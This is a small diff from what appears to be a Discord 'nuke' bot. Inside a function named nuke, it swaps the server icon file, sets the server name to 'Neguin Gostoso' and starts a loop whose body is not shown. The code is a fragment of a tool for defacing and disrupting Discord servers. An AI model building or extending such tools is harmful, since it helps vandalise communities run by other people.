@@ -36,7 +36,7 @@ async function nuke(guild) {
 		}
 	}
 
-	await guild.setIcon('./bosta.jpg');
+	await guild.setIcon('./icon.jpg');
 	await guild.setName('Neguin Gostoso');
 
 	for (let i = 0; i <= 20; i++) {
